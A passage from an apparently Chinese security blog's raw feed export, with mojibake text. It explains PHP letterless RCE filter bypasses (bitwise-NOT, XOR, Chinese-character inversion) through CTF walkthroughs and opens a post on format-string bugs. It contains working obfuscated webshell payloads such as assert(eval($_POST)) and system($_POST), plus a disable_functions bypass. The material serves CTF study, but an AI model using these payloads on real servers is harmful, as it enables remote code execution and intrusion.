class="string">&quot;%8c&quot;</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%8b&quot;</span>));</span><br><span class="line"><span class="comment">#è¾“å‡º:%91</span></span><br></pre></td></tr></table></figure>

<p>æ•…æœ‰å¦‚ä¸‹ç»“è®ºï¼š</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="variable">%8</span>F<span class="variable">%8</span>D<span class="variable">%96</span><span class="variable">%91</span><span class="variable">%8</span>B<span class="variable">%A0</span><span class="variable">%8</span>D <span class="operator">=</span> (<span class="variable">%8</span>F<span class="variable">%8</span>D<span class="variable">%96</span><span class="variable">%96</span><span class="variable">%8</span>B<span class="variable">%A0</span><span class="variable">%8</span>D)^(<span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%8</span><span class="keyword">c</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span>)^(<span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%8</span>b<span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span>)</span><br></pre></td></tr></table></figure>

<h2 id="å–å"><a href="#å–å" class="headerlink" title="å–å"></a>å–å</h2><p>å› ä¸ºå–ååçš„ç»“æœæœ‰ä¸å¯è§å­—ç¬¦ï¼Œæ•…éœ€å¯¹å…¶è¿›è¡Œ<code>url</code>ç¼–ç ï¼Œè€Œ<code>_GET</code>ä¼ å‚ä¼šå¯¹<code>url</code>ç¼–ç çš„å†…å®¹è¿›è¡Œè§£ç ã€‚</p>
<h3 id="æ³•ä¸€-1"><a href="#æ³•ä¸€-1" class="headerlink" title="æ³•ä¸€"></a>æ³•ä¸€</h3><p>å¯¹<code>_POST</code>è¿›è¡Œå–åå¹¶<code>url</code>ç¼–ç ï¼Œåœ¨è§£ç å–åå¾—åˆ°ã€‚ç”±äºè¿™éƒ¨åˆ†è¦ä¸<code>assert()</code>ä¸€èµ·åˆ©ç”¨ï¼Œæ•…<code>(eval($_POST[_]))</code>è¿™é‡Œå¤–å±‚åŠ ä¸Šäº†æ‹¬å·ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;_POST&#x27;</span>);   <span class="comment">#%A0%AF%B0%AC%AB</span></span><br><span class="line"><span class="keyword">echo</span> ~<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%A0%AF%B0%AC%AB&#x27;</span>);</span><br><span class="line"></span><br><span class="line">(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%D7%<span class="number">93</span>%<span class="number">8</span>C%D6);</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>æ„é€ <code>eval($_POST[_]);</code></p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"># assert  %9E%8C%8C%9A%8D%8B</span><br><span class="line"># (<span class="keyword">eval</span>($_POST[_]))  %D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%A0%A2%D6%D6</span><br><span class="line"># (~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%A0%A2%D6%D6);</span><br><span class="line">#å³ (assert)((<span class="keyword">eval</span>($_POST[_])));</span><br></pre></td></tr></table></figure>

<p>æ„é€ <code>phpinfo();</code></p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="attr"># phpinfo  %8</span>F<span class="meta">%</span><span class="number">97</span><span class="meta">%</span><span class="number">8</span>F<span class="meta">%</span><span class="number">96</span><span class="meta">%</span><span class="number">91</span><span class="meta">%</span><span class="number">99</span><span class="meta">%</span><span class="number">90</span></span><br><span class="line"><span class="attr"># (~%8</span>F<span class="meta">%</span><span class="number">97</span><span class="meta">%</span><span class="number">8</span>F<span class="meta">%</span><span class="number">96</span><span class="meta">%</span><span class="number">91</span><span class="meta">%</span><span class="number">99</span><span class="meta">%</span><span class="number">90</span>)<span class="comment">()</span>;   <span class="attr">#å³ä¸º phpinfo();</span></span><br></pre></td></tr></table></figure>

<p>å¦ä¸€ç§æ–¹å¼æ„é€ <code>system($_POST[_])</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span> = ~(%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>);   <span class="comment">#å®šä¹‰å˜é‡$_ä¸ºsystem</span></span><br><span class="line"><span class="variable">$__</span> = ~(%A0%AF%B0%AC%AB);  <span class="comment">#å®šä¹‰å˜é‡$__ä¸º_POST</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$$__</span>;   <span class="comment">#å®šä¹‰å˜é‡$___ä¸º$$__ï¼Œå³ä¸º$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);   <span class="comment">#å³ä¸º assert($_POST[_]);</span></span><br><span class="line"><span class="comment">#å°†å–åç»“æœä»£å…¥</span></span><br><span class="line"><span class="comment"># $_ = ~(%8C%86%8C%8B%9A%92);$__ = ~(%A0%AF%B0%AC%AB);$___ = $$__;$_($___[_]);</span></span><br></pre></td></tr></table></figure>

<h3 id="æ³•äºŒ-1"><a href="#æ³•äºŒ-1" class="headerlink" title="æ³•äºŒ"></a>æ³•äºŒ</h3><p>è¿™ç§æ–¹æ³•æ˜¯åˆ©ç”¨æ±‰å­—å–åæ„é€ ã€‚</p>
<p>å¯ä»¥é€šè¿‡å¯¹<code>&#39;æ„&#39;&#123;1&#125;</code>è¿›è¡Œå–åï¼Œæ¥æ„é€ å­—ç¬¦<code>a</code>ï¼Œè€Œ<code>1</code>å¯ä»¥é€šè¿‡<code>&#39;_&#39;==&#39;_&#39;</code>æ¥è·å¾—ã€‚<code>&#39;_&#39;==&#39;_&#39;</code>ç»“æœä¸ºçœŸï¼Œæ•…è¿”å›<code>1</code>ï¼Œåä¹‹<code>&#39;_&#39;==&#39;__&#39;</code>ç»“æœä¸ºå‡ï¼Œè¿”å›<code>0</code>ã€‚</p>
<p>æ„é€ <code>phpinfo();</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=[]==[];</span><br><span class="line"><span class="variable">$__</span>=~å¯[<span class="variable">$_</span>].~æ—¶[<span class="variable">$_</span>].~å¯[<span class="variable">$_</span>].~æ–°[<span class="variable">$_</span>].~å‘¨[<span class="variable">$_</span>].~ç™½[<span class="variable">$_</span>].~å‘[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>();</span><br></pre></td></tr></table></figure>

<p>æ„é€ <code>system($_POST[_]);</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=[]==[];</span><br><span class="line"><span class="variable">$__</span>=~åŒ—[<span class="variable">$_</span>].~å†²[<span class="variable">$_</span>].~åŒ—[<span class="variable">$_</span>].~è‹[<span class="variable">$_</span>].~çš‡[<span class="variable">$_</span>].~å’Œ[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$___</span>=~ç [<span class="variable">$_</span>].~å¯¸[<span class="variable">$_</span>].~å°[<span class="variable">$_</span>].~æ¬ [<span class="variable">$_</span>].~ç«‹[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>(<span class="variable">$$___</span>[_]);</span><br></pre></td></tr></table></figure>

<p>å¯»æ‰¾å¯¹åº”æ±‰å­—çš„è„šæœ¬ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">finds</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$lst</span> = [<span class="string">&#x27;ç &#x27;</span>,<span class="string">&#x27;æ&#x27;</span>,<span class="string">&#x27;å‡&#x27;</span>,<span class="string">&#x27;çœŸ&#x27;</span>,<span class="string">&#x27;é›¨&#x27;</span>,<span class="string">&#x27;éš&#x27;</span>,<span class="string">&#x27;ç™½&#x27;</span>,<span class="string">&#x27;æ˜&#x27;</span>,<span class="string">&#x27;æ—¶&#x27;</span>,<span class="string">&#x27;æ–°&#x27;</span>,<span class="string">&#x27;æ•ˆ&#x27;</span>,<span class="string">&#x27;æ”¿&#x27;</span>,<span class="string">&#x27;å“&#x27;</span>,<span class="string">&#x27;å’Œ&#x27;</span>,<span class="string">&#x27;å‘¨&#x27;</span>,<span class="string">&#x27;å‘&#x27;</span>,<span class="string">&#x27;å¯&#x27;</span>,<span class="string">&#x27;ç°&#x27;</span>,<span class="string">&#x27;å—&#x27;</span>,<span class="string">&#x27;åŒ—&#x27;</span>,<span class="string">&#x27;è‹&#x27;</span>,<span class="string">&#x27;èŠ‚&#x27;</span>,<span class="string">&#x27;å‰&#x27;</span>,<span class="string">&#x27;æˆ‘&#x27;</span>,<span class="string">&#x27;å‡º&#x27;</span>,<span class="string">&#x27;å†µ&#x27;</span>,<span class="string">&#x27;å…³&#x27;</span>,<span class="string">&#x27;ä¾¯&#x27;</span>,<span class="string">&#x27;å½¤&#x27;</span>,<span class="string">&#x27;å¼€&#x27;</span>,<span class="string">&#x27;ä»¥&#x27;</span>,<span class="string">&#x27;äº‹&#x27;</span>,<span class="string">&#x27;å¹´&#x27;</span>,<span class="string">&#x27;ä¸­&#x27;</span>,<span class="string">&#x27;å·¥&#x27;</span>,<span class="string">&#x27;è¶Š&#x27;</span>,<span class="string">&#x27;èµ„&#x27;</span>,<span class="string">&#x27;è´¨&#x27;</span>,<span class="string">&#x27;æ³•&#x27;</span>,<span class="string">&#x27;ç²‰&#x27;</span>,<span class="string">&#x27;å±•&#x27;</span>,<span class="string">&#x27;å°±&#x27;</span>,<span class="string">&#x27;å¯¹&#x27;</span>,<span class="string">&#x27;å®¶&#x27;</span>,<span class="string">&#x27;å­¦&#x27;</span>,<span class="string">&#x27;æ¬¢&#x27;</span>,<span class="string">&#x27;é«˜&#x27;</span>,<span class="string">&#x27;éªŒ&#x27;</span>,<span class="string">&#x27;ç©º&#x27;</span>,<span class="string">&#x27;ç¨‹&#x27;</span>,<span class="string">&#x27;è§„&#x27;</span>,<span class="string">&#x27;ç¦»&#x27;</span>,<span class="string">&#x27;ç¥&#x27;</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$lst</span>);<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$string</span>[<span class="variable">$i</span>]==~<span class="variable">$lst</span>[<span class="variable">$j</span>][<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$string</span>[<span class="variable">$i</span>].<span class="string">&#x27;:&#x27;</span>.<span class="variable">$lst</span>[<span class="variable">$j</span>].<span class="string">&quot;   &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">finds</span>(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><h3 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a><code>[SUCTF 2019]EasyWeb</code></h3><p><a href="https://buuoj.cn/challenges#[SUCTF%202019]EasyWeb">SUCTF 2019EasyWeb</a></p>
<p>è¦ç»•è¿‡å¦‚ä¸‹è¿‡æ»¤ï¼š</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060223347.png" alt="image-20250119103540779" style="zoom:50%;" />

<p>å·²çŸ¥<code>_,G,E,T</code>å­—ç¬¦å¯ä»¥å¦‚ä¸‹æ„æˆ</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">_:<span class="meta">%</span><span class="number">86</span>^<span class="meta">%</span>d<span class="number">9</span></span><br><span class="line">G:<span class="meta">%</span><span class="number">86</span>^<span class="meta">%</span>c<span class="number">1</span></span><br><span class="line">E:<span class="meta">%</span><span class="number">86</span>^<span class="meta">%</span>c<span class="number">3</span></span><br><span class="line">T:<span class="meta">%</span><span class="number">86</span>^<span class="meta">%</span>d<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>æ„é€ æ‰§è¡Œ<code>phpinfo()</code>çš„payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[code]);</span><br><span class="line"><span class="comment"># ?code=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo</span></span><br></pre></td></tr></table></figure>

<h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a><code>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</code></h3><p>æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="comment">#é™åˆ¶</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>) <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>)) <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†å¤§å°å†™å­—æ¯å’Œæ•°å­—</p>
<p>å…ˆé€šè¿‡phpinfo()æµ‹è¯•ä¸€ä¸‹</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"># phpinfo  %8F%97%8F%96%91%99%90</span><br><span class="line"># phpinfo();  (!phpinfo)();</span><br><span class="line">?code = (~%8F%97%8F%96%91%99%90)();</span><br><span class="line">#(assert)((<span class="keyword">eval</span>($_POST[shell])));</span><br><span class="line">?code = (~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6%D6);</span><br></pre></td></tr></table></figure>

<p><code>%8F%97%8F%96%91%99%90</code>æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæ˜¯ç”±å­—ç¬¦ä¸²<code>phpinfo</code>å…ˆå–åå†è¿›è¡Œ<code>url</code>ç¼–ç æ‰€å¾—åˆ°çš„ä¸€ä¸²ç¼–ç ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$p</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;assert&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;(eval($_POST[shell]))&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment"># %8F%97%8F%96%91%99%90</span></span><br><span class="line">    <span class="comment">#%9E%8C%8C%9A%8D%8B</span></span><br><span class="line">	<span class="comment">#%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6%D6</span></span><br></pre></td></tr></table></figure>

<p><strong>è§£é¢˜ï¼š</strong></p>
<p>ä¼ å…¥å‚æ•°<code>?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6%D6);</code></p>
<p>èšå‰‘è¿æ¥<code>http://81ee6069-0856-4349-b89f-342253bbe6eb.node5.buuoj.cn:81/?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6%D6);</code></p>
<h4 id="ç»•è¿‡diasble-functions"><a href="#ç»•è¿‡diasble-functions" class="headerlink" title="ç»•è¿‡diasble_functions"></a>ç»•è¿‡<code>diasble_functions</code></h4><p>ç„¶åé€‰æ‹©ç»•è¿‡<code>diasble_functions</code>æ’ä»¶</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060223549.png" alt="image-20241103225407335" style="zoom:50%;" />

<p>é€‰æ‹©æ¨¡å¼ï¼Œ<code>PHP7_GC_UAF</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060224964.png" alt="image-20241103225445065" style="zoom:50%;" />

<p>åœ¨å‘½ä»¤è¡Œç•Œé¢ä¸­æ‰§è¡Œ<code>/readflag</code>ï¼Œå¾—åˆ°<code>flag</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060224985.png" alt="image-20241103225639279" style="zoom:67%;" />

<h3 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a><code>[SUCTF 2018]GetShell</code></h3><p><a href="https://buuoj.cn/challenges#[SUCTF%202018]GetShell">SUCTF 2018 GetShell</a></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060223534.png" alt="image-20250120154828228" style="zoom: 50%;" />

<p>ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œä¼šå¯¹æ–‡ä»¶ä¸­ä»ç¬¬äº”ä¸ªå­—ç¬¦åŠä»¥åä¾æ¬¡æ£€æŸ¥ï¼Œè¯¥è¿‡æ»¤çš„éƒ½è¿‡æ»¤å®Œäº†ï¼Œå°±åªå‰©ä¸‹<code>$ ~ [] _ () ; .</code>è¿™äº›å­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œè¿™é‡Œåˆ©ç”¨ä¸€ç§æ±‰å­—å–åçš„æ–¹æ³•ã€‚</p>
<p>æ„é€ <code>system($_POST[_]);</code>ï¼Œå¹¶ä¸Šä¼ </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[]==[];</span><br><span class="line"><span class="variable">$__</span>=~åŒ—[<span class="variable">$_</span>].~å†²[<span class="variable">$_</span>].~åŒ—[<span class="variable">$_</span>].~è‹[<span class="variable">$_</span>].~çš‡[<span class="variable">$_</span>].~å’Œ[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$___</span>=~ç [<span class="variable">$_</span>].~å¯¸[<span class="variable">$_</span>].~å°[<span class="variable">$_</span>].~æ¬ [<span class="variable">$_</span>].~ç«‹[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>(<span class="variable">$$___</span>[_]);</span><br></pre></td></tr></table></figure>

<p><code>buu</code>ç¯å¢ƒåŸå› ï¼Œåªèƒ½åœ¨ç¯å¢ƒå˜é‡ä¸­æŸ¥çœ‹flagï¼Œ<code>system(&#39;env&#39;)</code>æŸ¥çœ‹ç³»ç»Ÿä¸­çš„ç¯å¢ƒå˜é‡ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060224304.png" alt="image-20250120155728131"></p>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://arsenetang.github.io/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/#2-%E5%8F%96%E5%8F%8D">RCEç¯‡ä¹‹æ— æ•°å­—å­—æ¯rce</a></p>
<p><a href="https://blog.csdn.net/qq_61778128/article/details/127063407">æ— æ•°å­—å­—æ¯rceæ€»ç»“ï¼ˆå–åã€å¼‚æˆ–ã€è‡ªå¢ã€ä¸´æ—¶æ–‡ä»¶ï¼‰-CSDNåšå®¢</a></p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å­¦ä¹ æ€»ç»“</title>
    <url>/2024/01/29/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h1><h2 id="printfä¸­çš„æ ¼å¼æ§åˆ¶ç¬¦"><a href="#printfä¸­çš„æ ¼å¼æ§åˆ¶ç¬¦" class="headerlink" title="printfä¸­çš„æ ¼å¼æ§åˆ¶ç¬¦"></a><code>printf</code>ä¸­çš„æ ¼å¼æ§åˆ¶ç¬¦</h2><p>â€‹	æ ¼å¼æ§åˆ¶ç¬¦å‘Šè¯‰å‡½æ•°å¦‚ä½•è§£æå’Œå¤„ç†ä¼ é€’ç»™å®ƒä»¬çš„å‚æ•°ã€‚å¦‚æœ<code>printf</code>ä¸­çš„æ ¼å¼æ§åˆ¶ç¬¦æ²¡æœ‰å¯¹åº”çš„å‚æ•°ï¼Œé‚£ä¹ˆå°†ä¼šæ³„æ¼å†…å­˜ä¸­çš„æ•°æ®ã€‚ä¸€ä¸ª<code>%</code>å¯ä»¥è§£æä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯å¯¹åº”ä¸€ä¸ªå‚æ•°ã€‚</p>
<span id="more"></span>

<ul>
<li><p><code>%c</code>ï¼šä»¥å­—ç¬¦å½¢å¼è¾“å‡º</p>
</li>
<li><p><code>%d</code>ï¼šä»¥åè¿›åˆ¶æ•´æ•°å½¢å¼è¾“å‡º</p>
</li>
<li><p><code>%x</code>ï¼šä»¥åå…­è¿›åˆ¶å½¢å¼è¾“å‡ºï¼Œ<code>%7$x</code>è¡¨ç¤ºè¾“å‡ºå‚æ•°åˆ—è¡¨ä¸­çš„ç¬¬ä¸ƒä¸ªå‚æ•°</p>
</li>
<li><p><code>%p</code>ï¼šä»¥åå…­è¿›åˆ¶å½¢å¼è¾“å‡ºï¼Œå¹¶åŠ ä¸Šå‰ç¼€<code>0x</code></p>
</li>
<li><p><code>%n</code>ï¼šå°†<code>%n</code>ä¹‹å‰<code>printf</code>å·²ç»æ‰“å°çš„å­—ç¬¦ä¸ªæ•°èµ‹å€¼ç»™åç§»å¤„æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ä½ç½®ã€‚</p>
<ul>
<li><code>%n</code>ï¼šå†™å…¥çš„åœ°å€ç©ºé—´ä¸º<code>4</code>ä¸ªå­—èŠ‚</li>
<li><code>%hn</code>ï¼šå†™å…¥çš„åœ°å€ç©ºé—´ä¸º<code>2</code>ä¸ªå­—èŠ‚</li>
<li><code>%hhn</code>ï¼šå†™å…¥çš„åœ°å€ç©ºé—´ä¸º<code>1</code>ä¸ªå­—èŠ‚</li>
<li><code>%lln</code>ï¼šå†™å…¥çš„åœ°å€ç©ºé—´ä¸º<code>8</code>ä¸ªå­—èŠ‚</li>
</ul>
</li>
</ul>
<h2 id="pwntoolsä¸­çš„fmtstr-paylod"><a href="#pwntoolsä¸­çš„fmtstr-paylod" class="headerlink" title="pwntoolsä¸­çš„fmtstr_paylod"></a><code>pwntools</code>ä¸­çš„<code>fmtstr_paylod</code></h2><p>â€‹	<code>fmtstr_payload</code>æ˜¯<code>pwntools</code>ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œå…¶å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset,writes,numbwritten,write_size)</span><br><span class="line"><span class="comment">#offsetæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åç§»é‡</span></span><br><span class="line"><span class="comment">#writesæ˜¯ä¸€ä¸ªå­—å…¸ï¼Œç”¨äºæŒ‡å®šè¦å†™å…¥çš„å€¼å’Œåœ°å€ï¼Œç»“æ„å¦‚ä¸‹</span></span><br><span class="line">write=&#123;</span><br><span class="line">    addr_1:value_1,</span><br><span class="line">	addr_2:value_2,</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#numbwrittenå‚æ•°è¡¨ç¤ºå‰é¢å·²ç»å†™å…¥çš„å­—èŠ‚æ•°</span></span><br><span class="line"><span class="comment">#write_sizeå‚æ•°è¡¨ç¤ºå†™å…¥çš„å­—èŠ‚å¤§å°ï¼Œé»˜è®¤ä¸º&#x27;byte&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="éæ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#éæ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="éæ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>éæ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h2><p>â€‹	æˆ‘ä»¬é€šå¸¸æ‰€è¯´çš„åœ¨æ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„æ„æ€å°±æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥æŠŠæ•°æ®å†™åˆ°æ ˆä¸Šï¼Œç„¶åå¯¹æ ˆä¸Šçš„æ•°æ®è¿›è¡Œä¸€ç³»åˆ—çš„æ”»å‡»ã€‚å¦‚<code>A</code>æ˜¯æ ˆä¸Šçš„ä¸€ä¸ªåœ°å€ï¼Œ<code>B</code>æ˜¯æˆ‘ä»¬è¦å†™åˆ°<code>A</code>é‡Œçš„<code>printf</code>çš„<code>got</code>è¡¨å€¼ï¼Œé‚£ä¹ˆç°åœ¨å°±æ˜¯<code>A -&gt; B -&gt; C</code>ï¼Œ<code>C</code>æ˜¯<code>printf</code>å‡½æ•°çš„<code>plt</code>è¡¨å€¼ã€‚ç„¶åæˆ‘ä»¬å¯ä»¥ä¿®æ”¹<code>B</code>è¿™ä¸ªåœ°å€ä¸­çš„å†…å®¹å³<code>C</code>ï¼Œæ”¹æˆåé—¨å‡½æ•°çš„åœ°å€ã€‚è€Œéæ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°±æ˜¯æˆ‘ä»¬ä¸èƒ½ç›´æ¥æŠŠ<code>B</code>å†™åˆ°æ ˆä¸Šï¼Œä½†æ˜¯ä¾ç„¶å¯ä»¥æ³„æ¼å’Œä¿®æ”¹æ ˆä¸­çš„åœ°å€ç­‰æ•°æ®ã€‚å¦‚æœæˆ‘ä»¬ä¸èƒ½ç›´æ¥æŠŠ<code>B</code>å†™åˆ°æ ˆä¸Šï¼Œæˆ‘ä»¬å¯ä»¥å…ˆåœ¨æ ˆä¸Šæ‰¾åˆ°<code>D -&gt; E -&gt; F</code>æŠŠ<code>F</code>ä¿®æ”¹æˆ<code>B</code>å°±å˜æˆäº†<code>D -&gt; E -&gt; B</code>ï¼Œä½†æ˜¯æˆ‘ä»¬æœ€åçš„ç›®çš„æ˜¯ä¿®æ”¹<code>B</code>æŒ‡å‘çš„åœ°å€ï¼Œæ‰€ä»¥è¯´è¿™é‡Œçš„<code>E</code>å¿…é¡»æ˜¯ä¸<code>A</code>å’Œ<code>D</code>ä¸€æ ·çš„æ ˆåœ°å€ï¼Œé‚£ä¹ˆ<code>E -&gt; F</code>å°±å˜æˆäº†<code>E -&gt; B -&gt; C</code>ï¼Œåˆå›åˆ°äº†æ ˆä¸Šã€‚</p>
